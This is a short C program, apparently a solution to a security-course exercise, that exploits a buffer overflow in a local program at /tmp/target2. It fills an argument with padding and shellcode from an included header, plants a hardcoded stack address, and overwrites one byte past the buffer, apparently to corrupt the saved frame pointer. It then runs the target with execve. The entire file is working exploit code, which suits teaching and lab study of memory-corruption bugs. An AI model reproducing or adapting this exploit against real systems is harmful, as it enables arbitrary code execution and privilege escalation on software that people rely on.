#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target2"

int main(void)
{
  char *args[3];
  char *env[1];

  args[0] = TARGET;
  args[1] = (char *)malloc(241 * sizeof(char));
  int i;
  for (i = 0; i < 240; ++ i) {
    args[1][i] = 'A';
  }

  int n = strlen(shellcode);
  int st = 240 - n;
  for(i = 0; i < n; ++ i) {
    args[1][st + i] = shellcode[i];
  }
  args[1][st - 4] = 0x4b;
  args[1][st - 3] = 0xfd;
  args[1][st - 2] = 0xff;
  args[1][st - 1] = 0xbf;

  // x/a $ebp
  // 0xbffffc68: 0xbffffd78
  // 0xbffffd78: 0xbffffd88

  args[1][240] = 0x43;

  args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
